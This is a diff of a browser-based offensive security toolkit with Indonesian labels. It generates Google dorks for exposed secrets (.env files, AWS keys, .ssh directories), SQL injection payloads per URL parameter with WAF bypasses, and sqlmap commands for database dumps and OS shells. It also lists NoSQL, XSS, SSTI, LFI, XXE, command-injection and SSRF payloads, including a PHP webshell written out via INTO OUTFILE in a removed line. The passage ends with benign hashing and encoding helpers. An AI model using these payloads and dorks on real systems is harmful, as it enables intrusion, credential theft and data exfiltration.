+var sig=[['Cloudflare',/cloudflare|cf-ray/i.test(keys)],['AWS WAF',/x-amzn|x-amz/i.test(keys)],['Imperva',/incapsula|imperva/i.test(t)],['Sucuri',/sucuri/i.test(keys+t)],['Akamai',/akamai/i.test(keys)]];
+outBox(b,sig.map(function(x){return(x[1]?'⚠ ':'  ')+x[0]}).join('\n')+'\n\nServer: '+(r.headers.get('server')||'-'))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
+
+reg(H,'CSP Evaluator','Evaluasi kelemahan Content-Security-Policy',['security'],
+async function(b,o){var u=ask('URL:','https://example.com');if(!u)return;
+try{var r=await cFetch(u);var c=r.headers.get('content-security-policy');
+if(!c){outBox(b,'✘ TIDAK ADA CSP');return}
+var out='CSP: '+c+'\n\n';
 if(/unsafe-inline/.test(c))out+='⚠ unsafe-inline\n';if(/unsafe-eval/.test(c))out+='⚠ unsafe-eval\n';
-if(!/frame-ancestors/.test(c))out+='⚠ tanpa frame-ancestors → clickjacking\n';
+if(c.indexOf('frame-ancestors')===-1)out+='⚠ tanpa frame-ancestors → clickjacking\n';
 outBox(b,out)}catch(e){outBox(b,'ERR: '+e.message)}bump()});
 
-reg(H,'CORS Origin Injector','Tes ACAO reflection dengan origin palsu',['security'],
-async(b,o)=>{const u=ask('URL:','https://example.com');if(!u)return;
-try{const r=await cFetch(u);const a=r.headers.get('access-control-allow-origin');
-outBox(b,a?(a==='*'?'⚠ ACAO: * — semua origin':a+' '+(/null/.test(a)?'⚠ null origin = berbahaya':'Reflection terbatas')):'Tidak ada ACAO')}catch(e){outBox(b,'ERR: '+e.message)}bump()});
+reg(H,'HTTP Methods Tester','Cek OPTIONS/PUT/DELETE/TRACE diaktifkan',['security'],
+async function(b,o){var u=ask('URL:','https://example.com');if(!u)return;
+try{var r=await cFetch(u);outBox(b,'Allow header: '+(r.headers.get('allow')||'(tidak ada — OPTIONS diblokir/limitasi CORS)')+'\n\nCek manual:\ncurl -X OPTIONS -i '+u+'\ncurl -X TRACE -i '+u)}catch(e){outBox(b,'ERR: '+e.message)}});
 
-reg(H,'Cookie Inspector','List cookie + audit flag session',['cookie'],
-async(b,o)=>{outBox(b,document.cookie?document.cookie:'(tidak ada cookie)\n💡 Audit HttpOnly/Secure/SameSite via DevTools → Application → Cookies')});
-
-reg(H,'WAF Detector','Deteksi Cloudflare/Imperva/AWS WAF dari response signature',['security'],
-async(b,o)=>{const u=ask('URL:','https://example.com');if(!u)return;
-try{const r=await cFetch(u);const t=await r.text();const h=r.headers;
-const sig=[['Cloudflare',/cloudflare/i.test(h.get('server')||'')||/cf-ray/i.test([...h.keys()].join())],
-['AWS WAF',/aws|x-amzn/i.test([...h.keys()].join())],
-['Imperva/Incapsula',/incapsula|imperva/i.test(t)],
-['Sucuri',/sucuri/i.test([...h.keys()].join()+(t||''))],
-['Akamai',/akamai/i.test([...h.keys()].join())]];
-outBox(b,sig.map(([n,f])=>(f?'⚠ ':'  ')+n).join('\n')+'\n\nServer: '+(h.get('server')||'-')+'\nCDN: '+(h.get('cf-ray')?'Cloudflare':h.get('x-amz-cf-id')?'CloudFront':'-'))}catch(e){outBox(b,'ERR: '+e.message)}bump()});
-
-reg(H,'HTTP Methods Tester','Cek OPTIONS / TRACE / PUT diaktifkan',['security'],
-async(b,o)=>{const u=ask('URL:','https://example.com');if(!u)return;
-let out='';for(const m of['OPTIONS','TRACE','PUT','DELETE','PATCH']){
-try{const r=await cFetch(u);out+=m+': '+r.status+' '+(r.headers.get('allow')||'-')+'\n';break}catch{}}outBox(b,out||'gagal fetch');bump()});
+reg(H,'Cookie Inspector','List cookie + audit flag',['cookie'],
+async function(b,o){outBox(b,document.cookie?document.cookie:'(tidak ada cookie)\n\nAudit HttpOnly/Secure/SameSite: DevTools → Application → Cookies')});
 
 /* ================= DORK GENERATOR (5) ================= */
-reg(D,'Dork Generator — File Sensitif','Dork Google untuk audit eksposur: .env, config, backup, sql, api key — klik link → Google',['dork'],
-async(b,o)=>{const dom=ask('Domain (kosong = global):','')||'';
-const d=dom?('site:'+dom+' '):'';
-const dorks=[d+'ext:env | ext:ini "DB_PASSWORD" | "API_KEY"',d+'ext:sql | ext:sqlite | ext:db "INSERT INTO" password',
-d+'ext:bak | ext:old | ext:backup inurl:config',d+'"index of" '+(dom?dom:'/.env')+' password',
-d+'intext:"api_key" | intext:"secret" ext:txt | ext:json | ext:yaml',d+'inurl:admin login password ext:log',
-d+'ext:yml "AWS_ACCESS_KEY_ID"',d+'filetype:env "APP_KEY" '+dom,d+'inurl:wp-config.php -site:wordpress.org',
-d+'intitle:"index of" '+(dom?dom:'')+' backup'];
-outBox(b,dorks.map((x,i)=>(i+1)+'. '+x+'\n   → https://www.google.com/search?q='+encodeURIComponent(x)).join('\n\n')+'\n\n⚠ Audit aset authorized only. Responsible disclosure.')});
+reg(D,'Dork — File Sensitif (.env/api key/backup)','Generate link Google dorking langsung — audit eksposur aset Anda',['dork'],
+async function(b,o){var dom=ask('Domain (kosong = global):','')||'';
+var d=dom?('site:'+dom+' '):'';
+var dorks=[d+'ext:env "DB_PASSWORD"',d+'ext:sql "INSERT INTO" password',d+'ext:bak | ext:old inurl:config',d+'"index of" .env',d+'intext:"api_key" ext:txt | ext:json',d+'ext:yml "AWS_ACCESS_KEY_ID"',d+'inurl:wp-config.php',d+'intitle:"index of" backup'];
+outBox(b,dorks.map(function(x,i){return (i+1)+'. '+x+'\n   → '+glink(x)}).join('\n\n')+'\n\n⚠ Audit aset authorized only. Responsible disclosure.')});
 
-reg(D,'Dork — Open Directory & Exposed Service','Index of / phpmyadmin /.git /.aws /.ssh',['dork'],
-async(b,o)=>{const dom=ask('Domain (opsional):','')||'';
-const d=dom?('site:'+dom+' '):'';
-const dorks=[d+'intitle:"index of" /backup',d+'intitle:"index of" /.git',d+'intitle:"index of" /.aws',
-d+'inurl:phpmyadmin',d+'inurl:.well-known/security.txt',d+'intitle:"index of" "docker-compose"',
-d+'inurl:/.svn/entries',d+'intitle:"Index of" ".ssh"',d+'inurl:actuator | inurl:/_cat/indices',d+'inurl:/debug/vars'];
-outBox(b,dorks.map((x,i)=>(i+1)+'. '+x+'\n   → https://www.google.com/search?q='+encodeURIComponent(x)).join('\n\n'));bump()});
+reg(D,'Dork — Open Directory & Exposed','index of / phpmyadmin /.git /.aws /.ssh',['dork'],
+async function(b,o){var dom=ask('Domain (opsional):','')||'';
+var d=dom?('site:'+dom+' '):'';
+var dorks=[d+'intitle:"index of" /backup',d+'intitle:"index of" /.git',d+'intitle:"index of" /.aws',d+'inurl:phpmyadmin',d+'intitle:"index of" "docker-compose"',d+'intitle:"Index of" ".ssh"',d+'inurl:actuator',d+'inurl:/debug/vars'];
+outBox(b,dorks.map(function(x,i){return (i+1)+'. '+x+'\n   → '+glink(x)}).join('\n\n'))});
 
-reg(D,'Dork — Login/Admin Panel','Temukan halaman login & admin scope pentest',['dork'],
-async(b,o)=>{const dom=ask('Domain:','');if(!dom)return;
-const dorks=['site:'+dom+' inurl:login|inurl:signin|inurl:admin','site:'+dom+' intitle:"admin panel"',
-'site:'+dom+' inurl:dashboard|inurl:portal','site:'+dom+' ext:php inurl:admin','site:'+dom+' intitle:"login" password'];
-outBox(b,dorks.map((x,i)=>(i+1)+'. '+x+'\n   → https://www.google.com/search?q='+encodeURIComponent(x)).join('\n\n'));bump()});
+reg(D,'Dork — Admin/Login Panel','Temukan halaman login untuk scope pentest',['dork'],
+async function(b,o){var dom=ask('Domain:','');if(!dom)return;
+var dorks=['site:'+dom+' inurl:login|inurl:admin','site:'+dom+' intitle:"admin panel"','site:'+dom+' inurl:dashboard|inurl:portal','site:'+dom+' ext:php inurl:admin'];
+outBox(b,dorks.map(function(x,i){return (i+1)+'. '+x+'\n   → '+glink(x)}).join('\n\n'))});
 
-reg(D,'Dork — Subdomain & Tech','Subdomain, staging, teknologi via Google',['dork'],
-async(b,o)=>{const dom=ask('Domain:','');if(!dom)return;
-const dorks=['site:*.'+dom+' -www','site:'+dom+' inurl:dev|inurl:stg|inurl:test|inurl:staging','site:'+dom+' ext:gitignore|ext:htaccess',
-'site:'+dom+' inurl:api | inurl:graphql','site:'+dom+' intitle:"dashboard" | intitle:"console"'];
-outBox(b,dorks.map((x,i)=>(i+1)+'. '+x+'\n   → https://www.google.com/search?q='+encodeURIComponent(x)).join('\n\n'));bump()});
+reg(D,'Dork — Subdomain & Staging','Subdomain, dev/staging via Google',['dork'],
+async function(b,o){var dom=ask('Domain:','');if(!dom)return;
+var dorks=['site:*.'+dom+' -www','site:'+dom+' inurl:dev|inurl:staging|inurl:test','site:'+dom+' ext:gitignore','site:'+dom+' inurl:api|inurl:graphql'];
+outBox(b,dorks.map(function(x,i){return (i+1)+'. '+x+'\n   → '+glink(x)}).join('\n\n'))});
 
-reg(D,'GHDB Top 20 Dork Koleksi','20 dork klasik Exploit-DB GHDB','[dork]',
-async(b,o)=>{const dk=['intitle:"web tester results"','"not for distribution" confidential intitle:index.of','inurl:"/wp-content/uploads/" filetype:sql',
-'intitle:"Apache Tomcat" "It works"','"Index of /" "backup"','inurl:".env" "DB_USERNAME"','"Ganglia" "Enterprise Monitoring"',
-'inurl:install/install.txt','intitle:"Welcome to nginx!"','inurl:server-info "Apache Server Information"','intitle:"phpMyAdmin"',
-'"# Default GTalk" inurl:gtalk.conf','inurl:webalizer "Usage by Country"','intitle:"sws" "Simple Web Server"',
-'inurl:wp-config -site:wp.com filetype:txt','filetype:log inurl:access.log','"HTTP_USER_AGENT" "HTTP_REFERER" intitle:"phpinfo()"',
-'inurl:"/cgi-bin/" ext:cgi "password"','intitle:"DVR" "Web Viewer"','inurl:login "password" ext:xml'];
-outBox(b,dk.map((x,i)=>(i+1)+'. '+x+'\n   → https://www.google.com/search?q='+encodeURIComponent(x)).join('\n\n'));bump()});
+reg(D,'GHDB Top 20 Koleksi','20 dork klasik Exploit-DB GHDB',['dork'],
+async function(b,o){var dk=['"not for distribution" confidential intitle:index.of','inurl:wp-config.php filetype:txt','intitle:"phpMyAdmin"','intitle:"Welcome to nginx!"','inurl:server-info "Apache Server Information"','filetype:log inurl:access.log','intitle:"phpinfo()"','inurl:install/install.txt','intitle:"Apache Tomcat" "It works"','"Index of /" "backup"','inurl:".env" "DB_USERNAME"','intitle:"index of" ".env"','inurl:webalizer "Usage by Country"','intitle:"DVR" "Web Viewer"','inurl:".env" "DB_PASSWORD"'];
+outBox(b,dk.map(function(x,i){return (i+1)+'. '+x+'\n   → '+glink(x)}).join('\n\n'))});
 
-/* ================= SQLI GENERATOR (8) ================= */
-reg(S,'SQLi Payload Generator (auto dari URL)','Auto-generate payload injection per parameter dari URL',['sqli'],
-async(b,o)=>{const u=ask('URL dengan parameter:','https://t.com/item.php?id=1&page=x');if(!u)return;
-const q=u.split('?')[1]||'';if(!q){outBox(b,'✘ Tidak ada parameter');return}
-const pay={boolean:["'","1' OR '1'='1","1' OR '1'='2","1 AND 1=1","1 AND 1=2"],
-union:["' UNION SELECT NULL--","' UNION SELECT NULL,NULL--","' UNION SELECT NULL,NULL,NULL--","' UNION SELECT username,password FROM users--"],
+/* ================= SQLI & PAYLOAD (8) ================= */
+reg(S,'SQLi Payload Generator (auto dari URL)','Tempel URL dengan parameter → auto-generate payload per parameter',['sqli'],
+async function(b,o){var u=ask('URL dengan parameter:','https://t.com/item.php?id=1&page=x');if(!u)return;
+var q=u.split('?')[1]||'';if(!q){outBox(b,'✘ Tidak ada parameter di URL');return}
+var pay={boolean:["'","1' OR '1'='1","1' OR '1'='2","1 AND 1=1","1 AND 1=2"],
+union:["' UNION SELECT NULL--","' UNION SELECT NULL,NULL--","' UNION SELECT NULL,NULL,NULL--"],
 time:["1' AND SLEEP(5)--","1 AND pg_sleep(5)--","1'; WAITFOR DELAY '0:0:5'--"],
-error:["' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"],
-bypass:["1 un/**/ion sel/**/ect null","1%20UNION%20ALL%20SELECT%20NULL","1 /*!50000UNION*/ /*!50000SELECT*/ NULL","1' or 1=1#","1' or '1'='1' /*"]};
-let out='TARGET: '+u+'\n\n';for(const[par]of q.split('&').map(x=>x.split('='))){
-out+='━ PARAMETER: '+par+' ━\n';
-out+='  [Boolean]\n'+pay.boolean.map(p=>'    '+p).join('\n')+'\n';
-out+='  [UNION]\n'+pay.union.map(p=>'    '+p).join('\n')+'\n';
-out+='  [Time-based]\n'+pay.time.map(p=>'    '+p).join('\n')+'\n';
-out+='  [Error-based]\n'+pay.error.map(p=>'    '+p).join('\n')+'\n';
-out+='  [WAF Bypass]\n'+pay.bypass.map(p=>'    '+p).join('\n')+'\n\n';}
-out+='## sqlmap: sqlmap -u "'+u+'" --batch --level=3\n⚠ Authorized targets only.';
+bypass:["1 un/**/ion sel/**/ect null","1 /*!50000UNION*/ /*!50000SELECT*/ NULL","1' or 1=1#"]};
+var out='TARGET: '+u+'\n\n';var params=q.split('&');
+for(var i=0;i<params.length;i++){var par=params[i].split('=')[0];
+out+='━ PARAMETER: '+par+' ━\n [Boolean]\n'+pay.boolean.map(function(p){return '    '+p}).join('\n')+'\n [Union]\n'+pay.union.map(function(p){return '    '+p}).join('\n')+'\n [Time]\n'+pay.time.map(function(p){return '    '+p}).join('\n')+'\n [WAF Bypass]\n'+pay.bypass.map(function(p){return '    '+p}).join('\n')+'\n\n'}
+out+='sqlmap: sqlmap -u "'+u+'" --batch --level=3\n⚠ Authorized targets only.';
 outBox(b,out);bump()});
 
-reg(S,'SQLi Cheat Sheet — Bypass WAF','Payload bypass filter/encoding',['sqli'],
-async(b,o)=>{outBox(b,`== BYPASS SPASI ==\n/**/  |  %20  |  +  |  %09(tab) |  ( ) nested
-== BYPASS KATA ==\nun/**/ion sel/**/ect  |  UNI%4fN  |  %55NION  |  uni%6fn
-== BYPASS QUOTE ==\n0x68656c6c6f (hex)  |  CHAR(104,101,108)  |  double-encoding
-== BYPASS = ==\nLIKE  |  RLIKE  |  REGEXP  |  <>  |  NOT IN
-== MYSQL FILE ==\n' UNION SELECT LOAD_FILE('/etc/passwd')--\n' UNION SELECT "<?system($_GET[c])?>" INTO OUTFILE '/var/www/shell.php'--
-== MSSQL ==\n'; EXEC xp_cmdshell 'whoami'--
-== POSTGRES ==\n'; COPY (SELECT '') TO PROGRAM 'id'--
-== ORACLE ==\n' UNION SELECT NULL,banner FROM v$version--
-== AUTH BYPASS ==\n' or 1=1-- | ' or 'a'='a | admin'-- | ' = ' | " or "" = "`);bump()});
+reg(S,'SQLi Cheat Sheet — WAF Bypass','Payload bypass filter/encoding',['sqli'],
+async function(b,o){outBox(b,'== BYPASS SPASI ==\n/**/  %20  +  %09\n== BYPASS KATA ==\nun/**/ion sel/**/ect | UNI%4fN | uni%6fn\n== BYPASS QUOTE ==\n0x68656c6c6f (hex) | CHAR(104,101,108)\n== MYSQL FILE ==\n\' UNION SELECT LOAD_FILE(\'/etc/passwd\')--\n== MSSQL ==\n\'; EXEC xp_cmdshell \'whoami\'--\n== POSTGRES ==\n\'; COPY (SELECT \'\') TO PROGRAM \'id\'--\n== AUTH BYPASS ==\n\' or 1=1-- | admin\'--')});
 
-reg(S,'SQLMap Command Generator','Generate command sqlmap lengkap',['sqli','sqlmap'],
-async(b,o)=>{const u=ask('URL:','https://t.com/page.php?id=1');const ck=ask('Cookie (opsional):','PHPSESSID=abc')||'';
-outBox(b,`# Basic:\nsqlmap -u "${u}" --batch
-# Dengan cookie:\nsqlmap -u "${u}" --cookie="${ck}" --batch
-# Agresif + tamper bypass:\nsqlmap -u "${u}" --level=5 --risk=3 --tamper=space2comment,between --batch
-# Dump database:\nsqlmap -u "${u}" --dbs --batch\nsqlmap -u "${u}" -D dbname --tables --batch\nsqlmap -u "${u}" -D dbname -T users --dump --batch
-# POST dari file:\nsqlmap -r request.txt --batch
-# OS Shell:\nsqlmap -u "${u}" --os-shell\n⚠ Authorized only.`);bump()});
+reg(S,'SQLMap Command Generator','Command sqlmap lengkap',['sqli','sqlmap'],
+async function(b,o){var u=ask('URL:','https://t.com/page.php?id=1');var ck=ask('Cookie (opsional):','')||'';
+outBox(b,'sqlmap -u "'+u+'" --batch\nsqlmap -u "'+u+'" --cookie="'+ck+'" --batch\nsqlmap -u "'+u+'" --level=5 --risk=3 --tamper=space2comment --batch\nsqlmap -u "'+u+'" --dbs --batch\nsqlmap -u "'+u+'" -D dbname -T users --dump --batch\nsqlmap -u "'+u+'" --os-shell\n⚠ Authorized only.')});
 
-reg(S,'SQLi Detection Heuristics','Signature error + cara uji manual',['sqli'],
-async(b,o)=>{outBox(b,`== SIGNATURE ERROR ==
-MySQL   : You have an error in your SQL syntax | Warning: mysql_
-Postgres: PG::Error | ERROR: syntax error at or near
-MSSQL   : Microsoft OLE DB Provider | Unclosed quotation mark
-Oracle  : ORA-01756 | ORA-00933
-SQLite  : SQLSTATE[HY000] | sqlite3.
-== UJI CEPAT ==
-1. Tambah ' → error? vuln indikasi
-2. id=1 vs id=1 AND 1=1 vs 1 AND 1=2
-3. id=2-1 → jika tampil id=1 → aritmetika dieksekusi
-4. time-based: AND SLEEP(5)
-== JANGAN LUPA ==
-- Parameter tersembunyi: POST, JSON, cookie, header (X-Forwarded-For)
-- Second-order: payload disimpan, dieksekusi halaman lain`);bump()});
+reg(S,'SQLi Detection Heuristics','Signature error per database + uji manual',['sqli'],
+async function(b,o){outBox(b,'== SIGNATURE ERROR ==\nMySQL   : You have an error in your SQL syntax\nPostgres: ERROR: syntax error at or near\nMSSQL   : Unclosed quotation mark\nOracle  : ORA-01756 | ORA-00933\nSQLite  : SQLSTATE[HY000]\n\n== UJI CEPAT ==\n1. Tambah \' → error?\n2. id=1 AND 1=1 vs id=1 AND 1=2 (bandingkan respons)\n3. id=2-1 → tampil id=1 = aritmetika dieksekusi\n4. AND SLEEP(5) → delay?')});
 
 reg(S,'NoSQL Injection Generator','Payload MongoDB injection',['sqli','nosql'],
-async(b,o)=>{const u=ask('Endpoint login:','https://t.com/api/login');
-outBox(b,`TARGET: ${u}\n\n== JSON BODY ==\n{"username":{"$ne":null},"password":{"$ne":null}}\n{"username":{"$gt":""},"password":{"$gt":""}}\n{"username":"admin","password":{"$regex":"^a"}}\n{"$where":"sleep(5000)"}\n\n== URL PARAM ==\n?username[$ne]=1&password[$ne]=1\n?username[$regex]=^admin\n\n== MONGOOSE ==\n{"email":{"$gte":"a"},"pass":{"$ne":""}}`);bump()});
+async function(b,o){var u=ask('Endpoint login:','https://t.com/api/login');
+outBox(b,'TARGET: '+u+'\n\n== JSON ==\n{"username":{"$ne":null},"password":{"$ne":null}}\n{"username":{"$gt":""},"password":{"$gt":""}}\n{"username":"admin","password":{"$regex":"^a"}}\n\n== URL ==\n?username[$ne]=1&password[$ne]=1')});
 
-reg(S,'XSS Payload Generator','Payload XSS modern per konteks',['xss'],
-async(b,o)=>{const ctx=ask('Konteks (html/attr/js/url):','html')||'html';
-const P={html:['<script>alert(1)</script>','<img src=x onerror=alert(1)>','<svg onload=alert(1)>','<body onload=alert(1)>','<iframe src=javascript:alert(1)>','<details open ontoggle=alert(1)>','<video><source onerror=alert(1)>','<marquee onstart=alert(1)>'],
-attr:['" onmouseover=alert(1) x="','\' onfocus=alert(1) autofocus \'',"javascript:alert(1)"],
-js:['</script><script>alert(1)</script>','";alert(1)//','\\';alert(1)//'],
-url:['javascript:alert(1)','data:text/html,<script>alert(1)</script>','%3Cscript%3Ealert(1)%3C/script%3E']};
-outBox(b,'KONTEKS: '+ctx+'\n\n'+P[ctx].map((x,i)=>(i+1)+'. '+x).join('\n')+'\n\nBypass: <ScRiPt>, <script >, \tnewline, HTML entities, double-encode');bump()});
+reg(S,'XSS Payload Generator','Payload XSS per konteks html/attr/js/url',['xss'],
+async function(b,o){var ctx=ask('Konteks (html/attr/js/url):','html')||'html';
+var P={html:['<script>alert(1)<\/script>','<img src=x onerror=alert(1)>','<svg onload=alert(1)>','<details open ontoggle=alert(1)>','<video><source onerror=alert(1)>'],
+attr:['" onmouseover=alert(1) x="',"\" onfocus=alert(1) autofocus \""],
+js:['<\/script><script>alert(1)<\/script>','";alert(1)//'],
+url:['javascript:alert(1)','data:text/html,<script>alert(1)<\/script>']};
+outBox(b,'KONTEKS: '+ctx+'\n\n'+P[ctx].map(function(x,i){return (i+1)+'. '+x}).join('\n')+'\n\nBypass: <ScRiPt>, double-encode')});
 
-reg(S,'Payload Builder — Multi Vuln','SSTI, LFI, RCE, XXE, SSRF, deserialization',['payload'],
-async(b,o)=>{outBox(b,`== SSTI ==\n{{7*7}}  ${'{'}7*7${'}'}  <%= 7*7 %>  {7*7}  #{7*7}
-== LFI ==\n../../../etc/passwd  ..%2f..%2f..%2fetc/passwd  php://filter/convert.base64-encode/resource=index\n/proc/self/environ  /var/log/auth.log
-== XXE ==\n<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
-== RCE ==\n; id  |  && id  |  $(id)  |  \`id\`  |  %0a id
-== DESERIALIZATION (JAVA) ==\nysoserial CommonsCollections1 'id' > p.ser
-== SSRF ==\nhttp://127.0.0.1:8080  http://169.254.169.254/latest/meta-data/  file:///etc/passwd\n gopher://127.0.0.1:6379/_INFO`);bump()});
+reg(S,'Multi-Vuln Payload Builder','SSTI, LFI, RCE, XXE, SSRF',['payload'],
+async function(b,o){outBox(b,'== SSTI ==\n{{7*7}}  <%= 7*7 %>  #{7*7}\n== LFI ==\n../../../etc/passwd | php://filter/convert.base64-encode/resource=index\n== XXE ==\n<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;<\/r>\n== RCE ==\n; id | && id | $(id) | %0a id\n== SSRF ==\nhttp://169.254.169.254/latest/meta-data/ | file:///etc/passwd')});
 
-reg(S,'Fuzzing Wordlist Generator','Generate wordlist custom untuk ffuf/gobuster',['fuzz'],
-async(b,o)=>{const base=ask('Base word:','admin');const n=parseInt(ask('Jumlah:','50'))||50;
-const exts=['','.php','.html','.bak','.old','.txt','.json','.zip','.sql','~'];
-const wl=[];for(let i=1;i<=n;i++){wl.push(base+i);if(i<10)wl.push(base+'0'+i)}
-exts.forEach(e=>wl.push(base+e));
-outBox(b,wl.slice(0,200).join('\n')+'\n\n💡 ffuf -w wordlist.txt -u https://target/FUZZ -mc 200');bump()});
+reg(S,'Fuzzing Wordlist Generator','Wordlist custom untuk ffuf/gobuster',['fuzz'],
+async function(b,o){var base=ask('Base word:','admin');var n=parseInt(ask('Jumlah:','50'))||50;
+var wl=[];for(var i=1;i<=n;i++)wl.push(base+i);
+['.php','.bak','.old','.txt','.zip'].forEach(function(e){wl.push(base+e)});
+outBox(b,wl.slice(0,150).join('\n')+'\n\nffuf -w wordlist.txt -u https://target/FUZZ -mc 200')});
 
-/* ================= CRYPTO / ENCODE (10) ================= */
-reg(C,'MD5 Hash','Generate MD5',['hash'],
-async(b,o)=>{const t=prompt('Teks:');if(t==null)return;outBox(b,CryptoJS.MD5(t));bump()});
-
-reg(C,'SHA-256 Hash','Generate SHA-256',['hash'],
-async(b,o)=>{const t=prompt('Teks:');if(t==null)return;outBox(b,CryptoJS.SHA256(t));bump()});
-
-reg(C,'SHA-512 Hash','Generate SHA-512',['hash'],
-async(b,o)=>{const t=prompt('Teks:');if(t==null)return;outBox(b,CryptoJS.SHA512(t));bump()});
-
-reg(C,'AES Encrypt','Enkripsi AES dengan kunci custom',['aes'],
-async(b,o)=>{const t=prompt('Teks:');const k=prompt('Kunci:');outBox(b,CryptoJS.AES.encrypt(t,k).toString());bump()});
-
+/* ================= CRYPTO / ENCODE (11) ================= */
+reg(C,'MD5 Hash','MD5 dari teks',['hash'],
+async function(b,o){var t=prompt('Teks:');if(t==null)return;outBox(b,CryptoJS.MD5(t));bump()});
+reg(C,'SHA-256 Hash','SHA-256 dari teks',['hash'],
+async function(b,o){var t=prompt('Teks:');if(t==null)return;outBox(b,CryptoJS.SHA256(t));bump()});
+reg(C,'SHA-512 Hash','SHA-512 dari teks',['hash'],
+async function(b,o){var t=prompt('Teks:');if(t==null)return;outBox(b,CryptoJS.SHA512(t));bump()});
+reg(C,'AES Encrypt','Enkripsi AES dengan kunci',['aes'],
+async function(b,o){var t=prompt('Teks:');var k=prompt('Kunci:');outBox(b,CryptoJS.AES.encrypt(t,k).toString());bump()});
 reg(C,'AES Decrypt','Dekripsi ciphertext AES',['aes'],
-async(b,o)=>{const t=prompt('Ciphertext:');const k=prompt('Kunci:');
+async function(b,o){var t=prompt('Ciphertext:');var k=prompt('Kunci:');
 try{outBox(b,CryptoJS.AES.decrypt(t,k).toString(CryptoJS.enc.Utf8)||'(kunci salah)')}catch(e){outBox(b,'Gagal decrypt')}});
-
 reg(C,'JWT Decoder','Decode header & payload JWT',['jwt'],
-async(b,o)=>{const t=prompt('Token JWT:');if(t==null)return;
-try{const[h,p]=t.split('.');const dec=s=>JSON.parse(decodeURIComponent(escape(atob(s.replace(/-/g,'+').replace(/_/g,'/')))));
-outBox(b,'HEADER:\n'+JSON.stringify(dec(h),null,2)+'\n\nPAYLOAD:\n'+JSON.stringify(dec(p),null,2))}catch(e){outBox(b,'Token tidak valid')}});
-
-reg(C,'Password Generator','Generate password kuat + entropy',['password'],
-async(b,o)=>{const n=parseInt(prompt('Panjang:','20'))||20;
-const cs='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}';
-const arr=new Uint32Array(n);crypto.getRandomValues(arr);
-outBox(b,[...arr].map(x=>cs[x%cs.length]).join('')+'\n\nEntropy: '+(Math.log2(cs.length)*n).toFixed(0)+' bits');bump()});
-
-reg(E,'Base64 Encoder','Encode teks ke Base64',['base64'],
-async(b,o)=>{const t=prompt('Teks:');if(t==null)return;outBox(b,btoa(unescape(encodeURIComponent(t))))});
-
-reg(E,'Base64 Decoder','Decode Base64 ke teks',['base64'],
-async(b,o)=>{const t=prompt('Base64:');if(t==null)return;
+async function(b,o){var t=prompt('Token JWT:');if(t==null)return;
+try{var p=t.split('.');var dec=function(s){return JSON.parse(decodeURIComponent(escape(atob(s.replace(/-/g,'+').replace(/_/g,'/')))))};
+outBox(b,'HEADER:\n'+JSON.stringify(dec(p[0]),null,2)+'\n\nPAYLOAD:\n'+JSON.stringify(dec(p[1]),null,2))}catch(e){outBox(b,'Token tidak valid')}});
+reg(C,'Password Generator','Password kuat + entropy',['password'],
+async function(b,o){var n=parseInt(prompt('Panjang:','20'))||20;
+var cs='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()';
+var a=new Uint32Array(n);crypto.getRandomValues(a);
+outBox(b,Array.from(a).map(function(x){return cs[x%cs.length]}).join('')+'\n\nEntropy: '+(Math.log2(cs.length)*n).toFixed(0)+' bits');bump()});
+reg(E,'Base64 Encode','Encode teks ke Base64',['base64'],
+async function(b,o){var t=prompt('Teks:');if(t==null)return;outBox(b,btoa(unescape(encodeURIComponent(t))))});
+reg(E,'Base64 Decode','Decode Base64 ke teks',['base64'],
+async function(b,o){var t=prompt('Base64:');if(t==null)return;
 try{outBox(b,decodeURIComponent(escape(atob(t))))}catch(e){outBox(b,'Base64 invalid')}});
-
 reg(E,'URL Encode/Decode','Encode & decode URL',['url'],
-async(b,o)=>{const t=prompt('Teks/URL:');if(t==null)return;outBox(b,'ENCODE: '+encodeURIComponent(t)+'\n\nDECODE: '+decodeURIComponent(t))});
+async function(b,o){var t=prompt('Teks/URL:');if(t==null)return;outBox(b,'ENCODE: '+encodeURIComponent(t)+'\n\nDECODE: '+decodeURIComponent(t))});
+reg(E,'ROT13 / Hex','ROT13 + hex encoder',['cipher','hex'],
+async function(b,o){var t=prompt('Teks:');if(t==null)return;
+outBox(b,'ROT13: '+t.replace(/[a-z]/gi,function(c){return String.fromCharCode(c.charCodeAt(0)+(c.toLowerCase()<'n'?13:-13))})+'\nHex: '+Array.from(new TextEncoder().encode(t)).map(function(x){return x.toString(16).padStart(2,'0')}).join(' '))});
 
-reg(E,'Hex Encoder','Encode teks ke hexadecimal',['hex'],
-async(b,o)=>{const t=prompt('Teks:');if(t==null)return;
-outBox(b,[...new TextEncoder().encode(t)].map(x=>x.toString(16).padStart(2,'0')).join(' '))});
-
-reg(E,'ROT13 / Caesar','Cipher ROT13 & Caesar custom shift',['cipher'],
-async(b,o)=>{const t=prompt('Teks:');if(t==null)return;
-outBox(b,'ROT13: '+t.replace(/[a-z]/gi,c=>String.fromCharCode(c.charCodeAt(0)+(c.toLowerCase()<'n'?13:-13)))+'\n\nCaesar shift 3: '+t.replace(/[a-z]/gi,c=>String.fromCharCode((c.charCodeAt(0)-(c<'a'?65:97)+3)%26+(c<'a'?65:97))));bump()});
-
-reg(E,'HTML Entities','Konversi karakter ke HTML entity',['html'],
-async(b,o)=>{const t=prompt('Teks:');if(t==null)return;outBox(b,esc(t))});
-
-/* ================= WEBDEV / CODE (8) ================= */
-reg(W,'QR Code Generator','Generate QR + download PNG',['qr'],
-async(b,o)=>{const t=prompt('Teks/URL:');if(t==null)return;
-const c=document.createElement('canvas');QRCode.toCanvas(c,t,{width:280,color:{dark:'#00ff41',light:'#000'}},err=>{
-if(err){outBox(b,'ERR: '+err);return}
-const box=outBox(b,'');c.style.maxWidth='100%';box.appendChild(c);
-const a=document.createElement('a');a.download='qr.png';a.href=c.toDataURL();a.textContent='⬇ Download PNG';a.style.cssText='display:block;margin-top:8px;color:#00ff41';box.appendChild(a)});bump()});
-
-reg(W,'JSON Formatter','Beautify & validate JSON',['json'],
